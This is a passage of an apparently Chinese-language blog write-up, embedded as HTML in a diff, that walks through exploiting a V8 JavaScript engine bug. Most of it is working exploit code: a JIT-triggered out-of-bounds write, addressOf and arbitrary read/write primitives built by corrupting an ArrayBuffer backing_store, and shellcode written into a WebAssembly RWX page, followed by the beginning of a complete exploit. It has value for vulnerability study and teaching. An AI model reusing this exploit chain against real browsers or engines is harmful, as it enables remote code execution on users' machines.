+  <span class="token keyword">let</span> x <span class="token operator">=</span> arguments<span class="token punctuation">.</span>length<span class="token punctuation">;</span>
+  a1 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Array</span><span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  a1<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">1.1</span><span class="token punctuation">;</span>
+  a2 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Array</span><span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  a2<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">1.1</span><span class="token punctuation">;</span>
+  a1<span class="token punctuation">[</span><span class="token punctuation">(</span>x <span class="token operator">>></span> <span class="token number">16</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">21</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">1.39064994160909e-309</span><span class="token punctuation">;</span>  <span class="token comment">// 0xffff00000000</span>
+  a1<span class="token punctuation">[</span><span class="token punctuation">(</span>x <span class="token operator">>></span> <span class="token number">16</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">41</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">1.39064994160909e-309</span><span class="token punctuation">;</span>  <span class="token comment">// 0xffff00000000</span>
+<span class="token punctuation">&#125;</span>
+
+<span class="token keyword">var</span> a1<span class="token punctuation">,</span> a2<span class="token punctuation">;</span>
+<span class="token keyword">var</span> a3 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">1.1</span><span class="token punctuation">,</span><span class="token number">2.2</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+a3<span class="token punctuation">.</span>length <span class="token operator">=</span> <span class="token number">0x11000</span><span class="token punctuation">;</span>
+
+<span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">100000</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token function">fun</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token comment">//%OptimizeFunctionOnNextCall(fun);</span>
+
+<span class="token function">fun</span><span class="token punctuation">(</span><span class="token operator">...</span>a3<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>其中的 <code>%OptimizeFunctionOnNextCall(fun)</code> 其实让 JIT 优化 <code>fun</code> 函数，其实可以用多次循环调用 <code>fun</code> 函数来替代</p>
+<p>这里为了方便后续的使用，还写了 BigInt 与 Float 类型的互相转换函数：</p>
+<pre class="line-numbers language-js" data-language="js"><code class="language-js"><span class="token keyword">var</span> fi_buf <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ArrayBuffer</span><span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token keyword">var</span> f_buf <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Float64Array</span><span class="token punctuation">(</span>fi_buf<span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token keyword">var</span> i_buf <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">BigUint64Array</span><span class="token punctuation">(</span>fi_buf<span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+<span class="token keyword">function</span> <span class="token function">f2i</span><span class="token punctuation">(</span><span class="token parameter">value</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+        f_buf<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> value<span class="token punctuation">;</span>
+        <span class="token keyword">return</span> i_buf<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span>
+
+<span class="token keyword">function</span> <span class="token function">i2f</span><span class="token punctuation">(</span><span class="token parameter">value</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+        i_buf<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> value<span class="token punctuation">;</span>
+        <span class="token keyword">return</span> f_buf<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+
+
+
+
+
+
+<h3 id="泄露对象地址"><a href="#泄露对象地址" class="headerlink" title="泄露对象地址"></a>泄露对象地址</h3><p>先定义一个对象 <code>objLeak</code>，有 <code>tag</code> 和 <code>leak</code> 属性，利用越界读，找到 <code>tag</code> 属性值 0x4567 相对于数组 a2 偏移的索引，即可得到 <code>leak</code> 属性对应的索引 <code>offset_leak</code>，再通过 <code>a2[offset_leak]</code> 即可将 <code>leak</code> 属性的 float 值读出来，只要往 <code>leak</code> 属性放入任意的对象，即可读出任意对象的地址</p>
+<p>代码如下：</p>
+<pre class="line-numbers language-js" data-language="js"><code class="language-js"><span class="token keyword">var</span> objLeak <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">'leak'</span><span class="token operator">:</span> <span class="token number">0x1234</span><span class="token punctuation">,</span> <span class="token string">'tag'</span><span class="token operator">:</span> <span class="token number">0x4567</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
+<span class="token keyword">var</span> offset_leak <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
+<span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">0xffff</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">f2i</span><span class="token punctuation">(</span>a2<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0x456700000000</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+                offset_leak <span class="token operator">=</span> i <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">;</span>
+                <span class="token keyword">break</span><span class="token punctuation">;</span>
+        <span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#125;</span>
+
+console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'offset_leak = '</span> <span class="token operator">+</span> offset_leak<span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+<span class="token keyword">function</span> <span class="token function">addressOf</span><span class="token punctuation">(</span><span class="token parameter">obj</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+        objLeak<span class="token punctuation">.</span>leak <span class="token operator">=</span> obj<span class="token punctuation">;</span>
+        <span class="token keyword">return</span> <span class="token function">f2i</span><span class="token punctuation">(</span>a2<span class="token punctuation">[</span>offset_leak<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span>
+
+
+<span class="token keyword">var</span> objTest <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">'aaa'</span><span class="token operator">:</span> <span class="token number">123</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
+
+<span class="token operator">%</span><span class="token function">DebugPrint</span><span class="token punctuation">(</span>objTest<span class="token punctuation">)</span><span class="token punctuation">;</span>
+console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'addressOf(objTest) = 0x'</span> <span class="token operator">+</span> <span class="token function">addressOf</span><span class="token punctuation">(</span>objTest<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token operator">%</span><span class="token function">SystemBreak</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>上面还用了 <code>objTest</code> 对象来测试 <code>addressOf</code>，调试结果如下：<br><img src="/images/696ac724/pasted-4.png" alt="upload successful"></p>
+<h3 id="任意地址读写"><a href="#任意地址读写" class="headerlink" title="任意地址读写"></a>任意地址读写</h3><p>任意地址读写其实也很简单，可以先定义一个 ArrayBuffer 对象，改写它的 backing_store 指针，就可以对指向的地方任意读写</p>
+<pre class="line-numbers language-js" data-language="js"><code class="language-js"><span class="token keyword">var</span> buf2write <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ArrayBuffer</span><span class="token punctuation">(</span><span class="token number">0xbeef</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token keyword">var</span> data_view <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">DataView</span><span class="token punctuation">(</span>buf2write<span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token keyword">var</span> offset_backing_store <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
+
+<span class="token operator">%</span><span class="token function">DebugPrint</span><span class="token punctuation">(</span>buf2write<span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token operator">%</span><span class="token function">SystemBreak</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>调试可以看到，ArrayBuffer 的 length 字段是指定的 0xbeef，用同样的方式，找到 0xbeef 即可找到对应在 a2 数组的索引，随之即可找到 backing_store 指针的位置<br><img src="/images/696ac724/pasted-5.png" alt="upload successful"></p>
+<p>代码如下：</p>
+<pre class="line-numbers language-js" data-language="js"><code class="language-js"><span class="token keyword">var</span> buf2write <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ArrayBuffer</span><span class="token punctuation">(</span><span class="token number">0xbeef</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token keyword">var</span> data_view <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">DataView</span><span class="token punctuation">(</span>buf2write<span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token keyword">var</span> offset_backing_store <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
+
+<span class="token operator">%</span><span class="token function">DebugPrint</span><span class="token punctuation">(</span>buf2write<span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token operator">%</span><span class="token function">SystemBreak</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+
+<span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">0xffff</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">f2i</span><span class="token punctuation">(</span>a2<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0xbeef</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+                offset_backing_store <span class="token operator">=</span> i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span>
+                <span class="token keyword">break</span><span class="token punctuation">;</span>
+        <span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#125;</span>
+
+
+
+<span class="token keyword">function</span> <span class="token function">write64</span><span class="token punctuation">(</span><span class="token parameter">addr<span class="token punctuation">,</span> value</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+        a2<span class="token punctuation">[</span>offset_backing_store<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">i2f</span><span class="token punctuation">(</span>addr<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        data_view<span class="token punctuation">.</span><span class="token function">setFloat64</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token function">i2f</span><span class="token punctuation">(</span>value<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span>
+
+<span class="token keyword">function</span> <span class="token function">read64</span><span class="token punctuation">(</span><span class="token parameter">addr</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+        a2<span class="token punctuation">[</span>offset_backing_store<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">i2f</span><span class="token punctuation">(</span>addr<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token keyword">return</span> <span class="token function">f2i</span><span class="token punctuation">(</span>data_view<span class="token punctuation">.</span><span class="token function">getFloat64</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span>
+
+<span class="token function">write64</span><span class="token punctuation">(</span><span class="token function">addressOf</span><span class="token punctuation">(</span>objTest<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">0x18n</span> <span class="token operator">-</span> <span class="token number">1n</span><span class="token punctuation">,</span> <span class="token number">0x2333n</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token operator">%</span><span class="token function">DebugPrint</span><span class="token punctuation">(</span>objTest<span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'value = 0x'</span> <span class="token operator">+</span> <span class="token function">read64</span><span class="token punctuation">(</span><span class="token function">addressOf</span><span class="token punctuation">(</span>objTest<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">0x18n</span> <span class="token operator">-</span> <span class="token number">1n</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token operator">%</span><span class="token function">SystemBreak</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>调试测试一下，这是 ArrayBuffer 修改前：<br><img src="/images/696ac724/pasted-7.png" alt="upload successful"></p>
+<p>然后看到 objTest 被改写了：<br><img src="/images/696ac724/pasted-8.png" alt="upload successful"></p>
+<p><img src="/images/696ac724/pasted-9.png" alt="upload successful"></p>
+<p>ArrayBuffer 也同预期那样，backing_store 指针被改写了：<br><img src="/images/696ac724/pasted-10.png" alt="upload successful"></p>
+<h3 id="利用-wasm-执行-shellcode"><a href="#利用-wasm-执行-shellcode" class="headerlink" title="利用 wasm 执行 shellcode"></a>利用 wasm 执行 shellcode</h3><p>大致按照下面的路线找到 RWX 段的地址，然后注入 shellcode 就行</p>
+<pre class="line-numbers language-none"><code class="language-none">wasmInstance.exports.main -&gt; shared_info -&gt; data -&gt; instance -&gt; rwx_page<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+
+<p>先构造一个 wasm 对象</p>
+<pre class="line-numbers language-js" data-language="js"><code class="language-js"><span class="token keyword">var</span> wasmCode <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Uint8Array</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">97</span><span class="token punctuation">,</span><span class="token number">115</span><span class="token punctuation">,</span><span class="token number">109</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">133</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">96</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">127</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">130</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">132</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">112</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">131</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">129</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token number">145</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">109</span><span class="token punctuation">,</span><span class="token number">101</span><span class="token punctuation">,</span><span class="token number">109</span><span class="token punctuation">,</span><span class="token number">111</span><span class="token punctuation">,</span><span class="token number">114</span><span class="token punctuation">,</span><span class="token number">121</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">109</span><span class="token punctuation">,</span><span class="token number">97</span><span class="token punctuation">,</span><span class="token number">105</span><span class="token punctuation">,</span><span class="token number">110</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token number">138</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">132</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">65</span><span class="token punctuation">,</span><span class="token number">42</span><span class="token punctuation">,</span><span class="token number">11</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+<span class="token keyword">var</span> wasmModule <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">WebAssembly<span class="token punctuation">.</span>Module</span><span class="token punctuation">(</span>wasmCode<span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token keyword">var</span> wasmInstance <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">WebAssembly<span class="token punctuation">.</span>Instance</span><span class="token punctuation">(</span>wasmModule<span class="token punctuation">,</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token keyword">var</span> f <span class="token operator">=</span> wasmInstance<span class="token punctuation">.</span>exports<span class="token punctuation">.</span>main<span class="token punctuation">;</span>
+
+<span class="token operator">%</span><span class="token function">DebugPrint</span><span class="token punctuation">(</span>f<span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token operator">%</span><span class="token function">SystemBreak</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>对象 shared_info 的地址在对象 f 的 +0x18 偏移处：<br><img src="/images/696ac724/pasted-11.png" alt="upload successful"></p>
+<p>对象 data 的地址在 shared_info 的 +0x8 偏移处：<br><img src="/images/696ac724/pasted-12.png" alt="upload successful"></p>
+<p>在 data 偏移 +0x10 处找到 instance 对象的地址：<br><img src="/images/696ac724/pasted-13.png" alt="upload successful"></p>
+<p>在 instance+0xe8 处找到 RWX 段的地址：<br><img src="/images/696ac724/pasted-14.png" alt="upload successful"></p>
+<p><img src="/images/696ac724/pasted-15.png" alt="upload successful"></p>
+<p>找 RWX 段的过程也可以参照本人之前写的 <a href="/3b546c3b">starctf oob 复现</a> 的文章</p>
+<p>写入 shellcode：</p>
+<pre class="line-numbers language-js" data-language="js"><code class="language-js"><span class="token keyword">var</span> f_addr <span class="token operator">=</span> <span class="token function">addressOf</span><span class="token punctuation">(</span>f<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1n</span><span class="token punctuation">;</span>
+<span class="token keyword">var</span> shared_info_addr <span class="token operator">=</span> <span class="token function">read64</span><span class="token punctuation">(</span>f_addr <span class="token operator">+</span> <span class="token number">0x18n</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1n</span><span class="token punctuation">;</span>
+<span class="token keyword">var</span> data_addr <span class="token operator">=</span> <span class="token function">read64</span><span class="token punctuation">(</span>shared_info_addr <span class="token operator">+</span> <span class="token number">0x8n</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1n</span><span class="token punctuation">;</span>
+<span class="token keyword">var</span> instance_addr <span class="token operator">=</span> <span class="token function">read64</span><span class="token punctuation">(</span>data_addr <span class="token operator">+</span> <span class="token number">0x10n</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1n</span><span class="token punctuation">;</span>
+<span class="token keyword">var</span> rwx_page_addr <span class="token operator">=</span> <span class="token function">read64</span><span class="token punctuation">(</span>instance_addr <span class="token operator">+</span> <span class="token number">0xe8n</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+
+<span class="token keyword">var</span> sc_arr <span class="token operator">=</span> <span class="token punctuation">[</span>
+    <span class="token number">0x10101010101b848n</span><span class="token punctuation">,</span>    <span class="token number">0x62792eb848500101n</span><span class="token punctuation">,</span>    <span class="token number">0x431480101626d60n</span><span class="token punctuation">,</span>    <span class="token number">0x2f7273752fb84824n</span><span class="token punctuation">,</span>
+    <span class="token number">0x48e78948506e6962n</span><span class="token punctuation">,</span>    <span class="token number">0x1010101010101b8n</span><span class="token punctuation">,</span>    <span class="token number">0x6d606279b8485001n</span><span class="token punctuation">,</span>    <span class="token number">0x2404314801010162n</span><span class="token punctuation">,</span>
+    <span class="token number">0x1485e086a56f631n</span><span class="token punctuation">,</span>    <span class="token number">0x313b68e6894856e6n</span><span class="token punctuation">,</span>    <span class="token number">0x101012434810101n</span><span class="token punctuation">,</span>    <span class="token number">0x4c50534944b84801n</span><span class="token punctuation">,</span>
+    <span class="token number">0x6a52d231503d5941n</span><span class="token punctuation">,</span>    <span class="token number">0x894852e201485a08n</span><span class="token punctuation">,</span>    <span class="token number">0x50f583b6ae2n</span><span class="token punctuation">,</span>
+<span class="token punctuation">]</span>
+
+<span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> i <span class="token operator">=</span> <span class="token number">0n</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> sc_arr<span class="token punctuation">.</span>length<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+        <span class="token function">write64</span><span class="token punctuation">(</span>rwx_page_addr <span class="token operator">+</span> i <span class="token operator">*</span> <span class="token number">8n</span><span class="token punctuation">,</span> sc_arr<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span>
+
+console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token function">f</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>成功弹出计算器：<br><img src="/images/696ac724/pasted-16.png" alt="upload successful"></p>
+<p>生成 shellcode 的脚本同样可以参考之前的文章 <a href="/3b546c3b">starctf oob 复现</a></p>
+<h2 id="完整-exp"><a href="#完整-exp" class="headerlink" title="完整 exp"></a>完整 exp</h2><pre class="line-numbers language-js" data-language="js"><code class="language-js"><span class="token keyword">var</span> fi_buf <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ArrayBuffer</span><span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token keyword">var</span> f_buf <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Float64Array</span><span class="token punctuation">(</span>fi_buf<span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token keyword">var</span> i_buf <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">BigUint64Array</span><span class="token punctuation">(</span>fi_buf<span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+<span class="token keyword">function</span> <span class="token function">f2i</span><span class="token punctuation">(</span><span class="token parameter">value</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+	f_buf<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> value<span class="token punctuation">;</span>
+	<span class="token keyword">return</span> i_buf<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span>
+
+<span class="token keyword">function</span> <span class="token function">i2f</span><span class="token punctuation">(</span><span class="token parameter">value</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+	i_buf<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> value<span class="token punctuation">;</span>
+	<span class="token keyword">return</span> f_buf<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span>
+
+
+<span class="token keyword">function</span> <span class="token function">fun</span><span class="token punctuation">(</span><span class="token parameter">arg</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+  <span class="token keyword">let</span> x <span class="token operator">=</span> arguments<span class="token punctuation">.</span>length<span class="token punctuation">;</span>
+  a1 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Array</span><span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  a1<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">1.1</span><span class="token punctuation">;</span>
+  a2 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Array</span><span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  a2<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">1.1</span><span class="token punctuation">;</span>
+  a1<span class="token punctuation">[</span><span class="token punctuation">(</span>x <span class="token operator">>></span> <span class="token number">16</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">21</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">1.39064994160909e-309</span><span class="token punctuation">;</span>  <span class="token comment">// 0xffff00000000</span>
+  a1<span class="token punctuation">[</span><span class="token punctuation">(</span>x <span class="token operator">>></span> <span class="token number">16</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">41</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">1.39064994160909e-309</span><span class="token punctuation">;</span>  <span class="token comment">// 0xffff00000000</span>
+<span class="token punctuation">&#125;</span>
+
